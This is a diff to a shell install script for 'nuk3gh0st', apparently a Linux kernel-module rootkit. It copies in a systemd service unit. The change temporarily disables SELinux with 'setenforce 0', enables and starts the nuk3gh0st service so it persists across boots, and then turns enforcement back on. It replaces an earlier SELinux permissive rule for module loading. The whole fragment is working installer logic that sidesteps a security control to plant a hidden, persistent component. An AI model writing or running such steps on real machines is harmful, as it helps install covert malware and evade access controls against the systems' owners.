@@ -17,16 +17,27 @@ cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
 echo -e "${item}Checking if SELINUX is enabled"
 if [ -f /usr/sbin/semanage ]; then
 	echo -e "${item}SELINUX is enabled"
-	echo -e "${item}Enabling insmod permissive mode"
-	echo -e "   ${purple}cmd: semanage permissive -a insmod_t${endColor}"
-	semanage permissive -a insmod_t
+	#semanage permissive -a insmod_t
+	echo -e "${item}Disabling SELINUX temporarily"
+	echo -e "   ${purple}cmd: setenforce 0${endColor}"
+	setenforce 0
+	echo -e "${item}Enabling nuk3gh0st.service"
+	echo -e "   ${purple}cmd: systemctl enable nuk3gh0st.service${endColor}"
+	systemctl enable nuk3gh0st.service
+	echo -e "${item}Starting nuk3gh0st.service"
+	echo -e "   ${purple}cmd: service nuk3gh0st start${endColor}"
+	service nuk3gh0st start
+	echo -e "${item}Reenabling SELINUX"
+	echo -e "   ${purple}cmd: setenforce 1${endColor}"
+	setenforce 1
+	
 else
 	echo -e "${item}SELINUX is disabled"
+	echo -e "${item}Enabling nuk3gh0st.service"
+	echo -e "   ${purple}cmd: systemctl enable nuk3gh0st.service${endColor}"
+	systemctl enable nuk3gh0st.service
+	echo -e "${item}Starting nuk3gh0st.service"
+	echo -e "   ${purple}cmd: service nuk3gh0st start${endColor}"
+	service nuk3gh0st start
 fi
-echo -e "${item}Enabling nuk3gh0st.service"
-echo -e "   ${purple}cmd: systemctl enable nuk3gh0st.service${endColor}"
-systemctl enable nuk3gh0st.service
-echo -e "${item}Starting nuk3gh0st.service"
-echo -e "   ${purple}cmd: service nuk3gh0st start${endColor}"
-service nuk3gh0st start
 echo ""
